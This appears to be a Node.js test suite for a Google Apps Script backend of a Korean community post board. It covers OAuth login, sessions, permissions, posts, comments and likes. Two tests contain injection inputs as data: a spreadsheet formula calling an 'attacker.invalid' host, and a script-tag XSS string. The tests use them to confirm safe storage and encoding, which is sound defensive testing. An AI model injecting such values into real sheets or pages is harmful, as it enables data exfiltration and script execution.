const { test } = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const fs = require('node:fs');
const { randomUUID, createHash } = require('node:crypto');
const source = fs.readFileSync(require('node:path').join(__dirname,'../apps-script/Code.gs'),'utf8');

function server() {
  const db = {}, cache = new Map(), props = {SPREADSHEET_ID:'test', GOOGLE_CLIENT_ID:'client', GOOGLE_CLIENT_SECRET:'secret',SITE_ORIGIN:'https://example.github.io',ADMIN_EMAILS:'admin@example.org'};
  const profile = {sub:'google-user-a',email:'a@example.org',email_verified:true,name:'회원 A'};
  let fetches=0;
  function sheet(name) {
    const data = db[name] ||= [];
    return {
      getLastRow:()=>data.length, appendRow:r=>data.push(r),setFrozenRows:()=>{},deleteRow:r=>data.splice(r-1,1),
      getRange(row,col,n=1,m=1) { return {getValues:()=>Array.from({length:n},(_,i)=>Array.from({length:m},(_,j)=>data[row-1+i]?.[col-1+j]??'')),setNumberFormat(){return this;},setValues(rows){rows.forEach((r,i)=>{data[row-1+i]||=[];r.forEach((v,j)=>data[row-1+i][col-1+j]=v);});return this;}}; }
    };
  }
  const context = vm.createContext({Date,JSON,Number,String,Error,RegExp,
    Utilities:{getUuid:randomUUID,DigestAlgorithm:{SHA_256:'sha256'},Charset:{UTF_8:'utf8'},computeDigest:(_,v)=>[...createHash('sha256').update(v).digest()]},
    PropertiesService:{getScriptProperties:()=>({getProperty:k=>props[k]})},
    CacheService:{getScriptCache:()=>({put:(k,v)=>cache.set(k,v),get:k=>cache.get(k),remove:k=>cache.delete(k)})},
    SpreadsheetApp:{openById:()=>({getSheetByName:name=>db[name]?sheet(name):null,insertSheet:sheet})},
    LockService:{getScriptLock:()=>({tryLock:()=>true,hasLock:()=>true,releaseLock:()=>{}})},
    HtmlService:{XFrameOptionsMode:{ALLOWALL:1},createHtmlOutput:html=>({html,setXFrameOptionsMode(){return this;}})},
    UrlFetchApp:{fetch:(url,options)=>{fetches++;if(url.endsWith('/token')){assert.equal(options.payload.client_secret,'secret');assert.equal(options.payload.redirect_uri,props.SITE_ORIGIN);return{getResponseCode:()=>200,getContentText:()=>JSON.stringify({access_token:'google-server-token'})};}assert.equal(options.headers.Authorization,'Bearer google-server-token');return{getResponseCode:()=>200,getContentText:()=>JSON.stringify(profile)};}}
  });
  vm.runInContext(source,context);context.setup();
  const call = (action,data={},session,visitorId) => context.dispatch_({action,data,session,visitorId});
  const login = (sub='google-user-a',email='a@example.org') => {profile.sub=sub;profile.email=email;return call('login',{code:'one-use-google-code',challenge:call('challenge').challenge});};
  const approve = id => {const m=context.find_('Members',id);m.status='approved';context.save_('Members',m);};
  return {context,call,login,approve,db,props,profile,get fetches(){return fetches;}};
}
const denied = (fn,code)=>assert.throws(fn,e=>e.cicCode===code);
const draft = () => ({title:'봉사 활동 기록',summary:'오늘 함께한 활동을 카드에 남깁니다.',body:'오늘 함께한 활동',attachmentIds:[],category:'activity',mutationId:randomUUID()});

test('anonymous users can read public posts while verified Google users are approved automatically',()=>{
  const s=server();assert.equal(s.call('listPosts').total,0);const a=s.login();assert.equal(a.member.status,'approved');assert.equal(s.call('listPosts',{},a.session).total,0);denied(()=>s.call('getPost',{id:'x'}),'NOT_FOUND');
});

test('title projections read only Posts and omit body, identity and media details',()=>{
  const s=server(), a=s.login();
  const p=s.call('createPost',draft(),a.session).post;
  const reads=[], original=s.context.rows_;
  s.context.rows_=name=>{reads.push(name);return original(name);};
  const list=s.call('listPosts',{view:'titles'});
  assert.deepEqual(reads,['Posts']);
  assert.deepEqual(Object.keys(list.posts[0]).sort(),['createdAt','id','title']);
  reads.length=0;
  assert.equal(s.call('getPost',{id:p.id,view:'title'}).post.title,p.title);
  assert.deepEqual(reads,['Posts']);
  const record=s.context.find_('Posts',p.id);record.deleted=true;s.context.save_('Posts',record);
  assert.equal(s.call('listPosts',{view:'titles'}).total,0);
  denied(()=>s.call('getPost',{id:p.id,view:'title'}),'NOT_FOUND');
});

test('progressive cards hydrate exact public IDs and newest pages do not pin notices',()=>{
  const s=server();
  for(let i=0;i<17;i++)s.context.save_('Posts',{id:'p'+String(i).padStart(2,'0'),title:'제목 '+i,body:'원문',category:i===0?'notice':'activity',createdAt:new Date(2026,0,i+1).toISOString(),attachments:[],deleted:i===16});
  assert.equal(s.call('listPosts',{view:'titles'}).posts[0].id,'p00');
  const first=s.call('listPosts',{view:'titles',sort:'newest'});
  assert.equal(first.pages,2);assert.equal(first.posts[0].id,'p15');
  assert.equal(s.call('listPosts',{view:'titles',sort:'newest',page:2}).posts[0].id,'p00');
  const cards=s.call('listPosts',{ids:['p00','p15','p16','missing']}).posts;
  assert.deepEqual(Array.from(cards,p=>p.id),['p00','p15']);
  assert.equal(cards[0].summary,'원문');assert.equal(cards[0].body,undefined);
  denied(()=>s.call('listPosts',{ids:Array(16).fill('p00')}),'INVALID');
  denied(()=>s.call('listPosts',{ids:'p00'}),'INVALID');
  denied(()=>s.call('listPosts',{ids:[{}]}),'INVALID');
  assert.equal(s.call('listPosts',{ids:[]}).posts.length,0);
});

test('Drive image thumbnails are sized without changing the full media URL',()=>{
  const s=server();
  const image=s.context.publicAttachment_({id:'a',driveId:'public-drive-id',mimeType:'image/jpeg',url:'https://example.invalid/original'});
  assert.equal(image.url,'https://lh3.googleusercontent.com/d/public-drive-id');
  assert.equal(image.thumbnailUrl,image.url+'=w480');
  const video=s.context.publicAttachment_({id:'v',driveId:'video',mimeType:'video/mp4',url:'https://example.invalid/video'});
  assert.equal(video.thumbnailUrl,'');assert.equal(video.url,'https://example.invalid/video');
});
test('a legacy pending member is approved on their next verified Google login',()=>{
  const s=server(),a=s.login();const record=s.context.find_('Members',a.member.id);record.status='pending';s.context.save_('Members',record);const renewed=s.login();assert.equal(renewed.member.status,'approved');
});
test('identity is obtained from Google and never from the submitted email',()=>{
  const s=server();const c=s.call('challenge').challenge;const a=s.call('login',{code:'code',challenge:c,email:'admin@example.org',role:'admin'});assert.equal(a.member.role,'member');assert.equal(s.fetches,2);
});
test('login challenge is one-use and invalid challenge causes no Google request',()=>{
  const s=server();denied(()=>s.call('login',{code:'code',challenge:'made-up'}),'AUTH');assert.equal(s.fetches,0);const challenge=s.call('challenge').challenge;s.call('login',{code:'code',challenge});denied(()=>s.call('login',{code:'code',challenge}),'AUTH');
});
test('Google accounts without verified email are rejected',()=>{
  const s=server();s.profile.email_verified=false;denied(()=>s.login(),'AUTH');assert.equal(s.context.rows_('Members').length,0);
});
test('session is stored only as a hash and expired sessions fail closed',()=>{
  const s=server(),a=s.login(),row=s.context.rows_('Sessions')[0];assert.notEqual(row.id,a.session);assert.equal(JSON.stringify(s.db).includes(a.session),false);row.expiresAt=0;s.context.save_('Sessions',row);denied(()=>s.call('me',{},a.session),'AUTH');
});
test('members cannot approve themselves or publish notices',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('setMemberStatus',{id:a.member.id,status:'approved'},a.session),'FORBIDDEN');denied(()=>s.call('createPost',{...draft(),category:'notice'},a.session),'FORBIDDEN');
});
test('post retries are idempotent, private payloads do not expose emails',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const d=draft(),p=s.call('createPost',d,a.session).post;assert.equal(s.call('createPost',d,a.session).post.id,p.id);const list=s.call('listPosts',{},a.session);assert.equal(list.total,1);assert.equal(JSON.stringify(list).includes('a@example.org'),false);assert.equal(list.posts[0].body,undefined);
});
test('optional summaries use the body preview without saving generated text',()=>{
  const s=server(),a=s.login();
  const p=s.call('createPost',{...draft(),summary:'  ',body:'첫 줄입니다.\n\n다음 줄입니다.'},a.session).post;
  assert.equal(p.summary,'');
  assert.equal(s.call('listPosts').posts[0].summary,'첫 줄입니다. 다음 줄입니다.');
  assert.equal(s.call('getPost',{id:p.id}).post.summary,'');
  assert.equal(s.context.find_('Posts',p.id).summary,'');
  const updated=s.call('updatePost',{...draft(),id:p.id,version:p.version,summary:'',body:'새로운 본문'},a.session).post;
  assert.equal(s.call('listPosts').posts[0].summary,'새로운 본문');
  s.call('updatePost',{...draft(),id:p.id,version:updated.version,summary:'직접 쓴 요약',body:'다른 본문'},a.session);
  assert.equal(s.call('listPosts').posts[0].summary,'직접 쓴 요약');
});
test('missing text leaves a blank preview and long body previews are bounded',()=>{
  const s=server(),a=s.login();
  const p=s.call('createPost',{...draft(),summary:undefined,body:undefined},a.session).post;
  assert.equal(s.call('listPosts').posts[0].summary,'');
  assert.equal(p.body,'');
  s.call('updatePost',{...draft(),id:p.id,version:p.version,summary:'',body:'가'.repeat(400)},a.session);
  assert.equal(s.call('listPosts').posts[0].summary,'가'.repeat(300));
  for(const summary of [null,42,{},'가'.repeat(301)])denied(()=>s.call('createPost',{...draft(),summary},a.session),'INVALID');
});
test('likes toggle once per anonymous browser or member, expose only count publicly, and retain an audit row while liked',()=>{
  const s=server(),a=s.login();const p=s.call('createPost',draft(),a.session).post;
  const visitor='a'.repeat(64);
  let like=s.call('toggleLike',{postId:p.id},undefined,visitor);assert.equal(like.liked,true);assert.equal(like.likeCount,1);
  const listed=s.call('listPosts');assert.equal(listed.posts[0].likeCount,1);assert.equal(listed.posts[0].likedByMe,false);assert.equal(Object.hasOwn(listed.posts[0],'memberId'),false);
  assert.equal(s.call('listPosts',{},undefined,visitor).posts[0].likedByMe,true);assert.equal(s.context.rows_('Likes').length,1);
  like=s.call('toggleLike',{postId:p.id},undefined,visitor);assert.equal(like.liked,false);assert.equal(like.likeCount,0);assert.equal(s.context.rows_('Likes').length,0);
  like=s.call('toggleLike',{postId:p.id},a.session);assert.equal(like.liked,true);assert.equal(like.likeCount,1);
  denied(()=>s.call('toggleLike',{postId:p.id}),'INVALID');
});
test('other members cannot change or delete someone else’s posts',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const b=s.login('google-user-b','b@example.org');s.approve(b.member.id);denied(()=>s.call('deletePost',{id:p.id,version:1},b.session),'FORBIDDEN');denied(()=>s.call('updatePost',{id:p.id,version:1,...draft()},b.session),'FORBIDDEN');
});
test('stale edits are rejected and author can update their own post',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const edited=s.call('updatePost',{...draft(),id:p.id,version:1,title:'수정한 제목'},a.session).post;assert.equal(edited.version,2);denied(()=>s.call('deletePost',{id:p.id,version:1},a.session),'CONFLICT');
});
test('post editing can add, retain, and remove completed attachments',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;
  const attachment=id=>({id,ownerId:a.member.id,name:id+'.jpg',mimeType:'image/jpeg',size:1,status:'complete',driveId:id,url:'https://example.invalid/'+id,postId:'',createdAt:'2026-01-01T00:00:00.000Z',updatedAt:'2026-01-01T00:00:00.000Z'});
  const first=attachment('first'),second=attachment('second');s.context.save_('Attachments',first);s.context.save_('Attachments',second);
  const withFirst=s.call('updatePost',{...draft(),id:p.id,version:p.version,attachmentIds:[first.id]},a.session).post;
  assert.deepEqual([...withFirst.attachments].map(x=>x.id),[first.id]);assert.equal(s.context.find_('Attachments',first.id).postId,p.id);
  const withSecond=s.call('updatePost',{...draft(),id:p.id,version:withFirst.version,attachmentIds:[second.id]},a.session).post;
  assert.deepEqual([...withSecond.attachments].map(x=>x.id),[second.id]);assert.equal(s.context.find_('Attachments',first.id).postId,'');assert.equal(s.context.find_('Attachments',second.id).postId,p.id);
});
test('comments enforce author rights and deleted parent hides all comments',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const d={postId:p.id,body:'댓글입니다',mutationId:randomUUID()};const c=s.call('createComment',d,a.session).comment;assert.equal(s.call('createComment',d,a.session).comment.id,c.id);const b=s.login('b','b@example.org');s.approve(b.member.id);denied(()=>s.call('updateComment',{id:c.id,version:1,body:'남의 댓글 수정'},b.session),'FORBIDDEN');s.call('deletePost',{id:p.id,version:1},a.session);denied(()=>s.call('getPost',{id:p.id},a.session),'NOT_FOUND');denied(()=>s.call('createComment',{...d,mutationId:randomUUID()},a.session),'NOT_FOUND');
});
test('comment creation returns its page and the current total for in-place UI updates',()=>{
  const s=server(),a=s.login(),b=s.login('google-user-b','b@example.org');const p=s.call('createPost',draft(),a.session).post;
  let result;
  for(let i=0;i<31;i++) result=s.call('createComment',{postId:p.id,body:'댓글 '+i,mutationId:randomUUID()},i<15?a.session:b.session);
  assert.equal(result.commentCount,31);assert.ok([1,2].includes(result.commentPage));assert.equal(result.commentPages,2);assert.equal(result.comment.postId,p.id);assert.ok(s.call('getPost',{id:p.id,commentPage:result.commentPage}).comments.some(c=>c.id===result.comment.id));
});
test('server rejects oversized and blank content and stores formulas as JSON text',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('createPost',{...draft(),title:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),body:'a'.repeat(10001)},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'unsafe.pdf',mimeType:'application/pdf',size:1},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'large.mp4',mimeType:'video/mp4',size:100*1024*1024+1},a.session),'INVALID');s.call('createPost',{...draft(),body:'=IMPORTXML("https://attacker.invalid","x")'},a.session);assert.equal(s.db.Posts[1][1][0],'{');
});
test('admin approval and immediate blocking revoke write access while public reading remains available',()=>{
  const s=server(),a=s.login(),admin=s.login('admin-sub','admin@example.org');assert.equal(admin.member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'approved'},admin.session);assert.equal(s.call('me',{},a.session).member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'blocked'},admin.session);assert.equal(s.call('listPosts',{},a.session).total,0);denied(()=>s.call('createPost',draft(),a.session),'AUTH');
});
test('removing admin from server properties revokes privileges immediately',()=>{
  const s=server(),a=s.login('admin-sub','admin@example.org');s.props.ADMIN_EMAILS='another@example.org';denied(()=>s.call('listMembers',{},a.session),'FORBIDDEN');
});
test('HTML transport uses exact target origin and safely encodes user text',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',{...draft(),body:'</script><script>alert(1)</script>'},a.session).post;const payload={requestId:'a'.repeat(64),origin:s.props.SITE_ORIGIN,action:'getPost',session:a.session,data:{id:p.id}};const out=s.context.doPost({parameter:{payload:JSON.stringify(payload)}}).html;assert.ok(out.includes('https://example.github.io'));assert.equal((out.match(/<script>/g)||[]).length,1);assert.ok(out.includes('\\u003c/script>'));
});
